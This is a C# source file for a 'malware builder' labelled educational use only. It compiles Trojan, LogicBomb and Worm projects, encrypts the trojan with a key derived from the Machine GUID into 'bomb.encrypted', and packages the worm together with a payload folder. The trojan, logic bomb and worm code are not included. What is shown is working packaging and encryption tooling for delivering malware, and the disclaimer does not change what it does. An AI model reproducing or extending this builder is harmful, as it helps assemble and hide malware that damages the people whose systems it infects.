using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using Microsoft.Win32;
using SharedCrypto;

namespace Builder
{
    class Program
    {
        private static string SolutionDir;
        private static string BuilderOutputDir;
        private static string PayloadDir;
        private static string MachineGuid;

        static void Main(string[] args)
        {
            Console.WriteLine("===========================================");
            Console.WriteLine("   MALWARE BUILDER - EDUCATIONAL USE ONLY");
            Console.WriteLine("   Polymorphic Encryption Edition");
            Console.WriteLine("===========================================");
            Console.WriteLine();

            try
            {
                InitializePaths();
                GetMachineGuidAndDeriveKeys();

                // Build all projects to ensure outputs are fresh
                BuildProject("SharedCrypto");
                BuildProject("Trojan");
                BuildProject("LogicBomb");
                BuildProject("Worm");

                EncryptTrojan();
                CreateOutputStructure();
                CleanupIntermediateFiles();

                Console.WriteLine();
                LogSuccess("Build completed successfully!");
                Console.WriteLine();
                LogInfo($"Output location: {BuilderOutputDir}");
                LogInfo("Structure:");
                LogInfo($"  product/");
                LogInfo($"    - Worm.exe");
                LogInfo($"    - SharedCrypto.dll");
                LogInfo($"    - SharedCrypto.pdb");
                LogInfo($"    - payload/");
                LogInfo($"        - LogicBomb.exe");
                LogInfo($"        - SharedCrypto.dll"); // <-- Now also here
                LogInfo($"        - SharedCrypto.pdb"); // <-- Now also here
                LogInfo($"        - bomb.encrypted");
                Console.WriteLine();
            }
            catch (Exception ex)
            {
                LogError($"BUILD FAILED: {ex.Message}");
                Console.WriteLine(ex.StackTrace);
                Environment.Exit(1);
            }

            Console.WriteLine("\nPress any key to exit...");
            Console.ReadKey();
        }

        private static void InitializePaths()
        {
            LogInfo("Initializing paths...");
            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            SolutionDir = Directory.GetParent(currentDir).Parent.Parent.Parent.FullName;
            BuilderOutputDir = Path.Combine(currentDir, "product");
            PayloadDir = Path.Combine(BuilderOutputDir, "payload");

            // Clean previous build
            if (Directory.Exists(BuilderOutputDir)) Directory.Delete(BuilderOutputDir, true);

            Directory.CreateDirectory(BuilderOutputDir);
            Directory.CreateDirectory(PayloadDir);
            LogSuccess($"Solution directory: {SolutionDir}");
            LogSuccess($"Output directory: {BuilderOutputDir}\n");
        }

        private static void GetMachineGuidAndDeriveKeys()
        {
            LogInfo("Retrieving Machine GUID for polymorphic encryption...");
            MachineGuid = CryptoUtils.GetMachineGuid();
            LogSuccess($"Machine GUID: {MachineGuid}");
            Console.WriteLine();
            LogInfo("Deriving encryption keys from Machine GUID...");
            CryptoUtils.LogDerivedKeys(MachineGuid);
            Console.WriteLine();
        }

        private static void BuildProject(string projectName)
        {
            LogInfo($"Building {projectName} project...");
            string projectPath = Path.Combine(SolutionDir, projectName, $"{projectName}.csproj");
            if (!File.Exists(projectPath)) throw new FileNotFoundException($"Project file not found: {projectPath}");

            var psi = new ProcessStartInfo("dotnet", $"build \"{projectPath}\" --configuration Debug")
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var process = Process.Start(psi))
            {
                process.WaitForExit();
                if (process.ExitCode != 0)
                {
                    throw new Exception($"Failed to build {projectName}. Output: \n{process.StandardOutput.ReadToEnd()}\n{process.StandardError.ReadToEnd()}");
                }
            }
            LogSuccess($"{projectName} built successfully\n");
        }

        private static void EncryptTrojan()
        {
            LogInfo("Encrypting Trojan.exe with machine-specific key...");
            string trojanExePath = FindFileInBuildOutput("Trojan", "Trojan.exe");
            string encryptedOutputPath = Path.Combine(PayloadDir, "bomb.encrypted");
            CryptoUtils.EncryptFile(trojanExePath, encryptedOutputPath, MachineGuid);
            LogSuccess($"Trojan.exe encrypted successfully to {encryptedOutputPath}\n");
        }

        private static void CreateOutputStructure()
        {
            LogInfo("Creating final output structure in 'product' folder...");

            // Copy Worm and its dependencies to the root
            CopyFileToProduct("Worm", "Worm.exe", BuilderOutputDir);
            CopyFileToProduct("SharedCrypto", "SharedCrypto.dll", BuilderOutputDir);
            CopyFileToProduct("SharedCrypto", "SharedCrypto.pdb", BuilderOutputDir);

            // Copy LogicBomb and its dependencies to the payload folder
            CopyFileToProduct("LogicBomb", "LogicBomb.exe", PayloadDir);
            CopyFileToProduct("SharedCrypto", "SharedCrypto.dll", PayloadDir);
            CopyFileToProduct("SharedCrypto", "SharedCrypto.pdb", PayloadDir);

            LogSuccess("bomb.encrypted is already in product/payload folder");
            LogSuccess("Output structure created successfully.\n");
        }

        private static void CopyFileToProduct(string projectName, string fileName, string destinationDir)
        {
            string sourcePath = FindFileInBuildOutput(projectName, fileName);
            string destPath = Path.Combine(destinationDir, fileName);
            File.Copy(sourcePath, destPath, true);
            LogSuccess($"Copied {fileName} to {destinationDir}");
        }

        private static string FindFileInBuildOutput(string projectName, string fileName)
        {
            // This helper function searches common build output paths
            string[] possiblePaths = new[]
            {
                Path.Combine(SolutionDir, projectName, "bin", "Debug", fileName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net472", fileName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net48", fileName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "netcoreapp3.1", fileName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net5.0", fileName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net6.0", fileName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net7.0", fileName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net8.0", fileName)
            };

            foreach (string path in possiblePaths)
            {
                if (File.Exists(path)) return path;
            }
            throw new FileNotFoundException($"{fileName} not found for project {projectName}");
        }

        private static void CleanupIntermediateFiles()
        {
            LogInfo("Cleaning up intermediate build files...");
            try
            {
                string[] projectsToClean = { "Worm", "LogicBomb", "Trojan", "SharedCrypto" };
                foreach (string project in projectsToClean)
                {
                    string binPath = Path.Combine(SolutionDir, project, "bin");
                    if (Directory.Exists(binPath)) Directory.Delete(binPath, true);

                    string objPath = Path.Combine(SolutionDir, project, "obj");
                    if (Directory.Exists(objPath)) Directory.Delete(objPath, true);
                }
                LogSuccess("Cleanup complete.\n");
            }
            catch (Exception ex)
            {
                LogWarning($"Cleanup warning: {ex.Message}");
            }
        }

        // Logging helpers
        private static void LogInfo(string message) { Console.ForegroundColor = ConsoleColor.Cyan; Console.WriteLine($"[INFO] {message}"); Console.ResetColor(); }
        private static void LogSuccess(string message) { Console.ForegroundColor = ConsoleColor.Green; Console.WriteLine($"[SUCCESS] {message}"); Console.ResetColor(); }
        private static void LogWarning(string message) { Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine($"[WARNING] {message}"); Console.ResetColor(); }
        private static void LogError(string message) { Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine($"[ERROR] {message}"); Console.ResetColor(); }
    }
}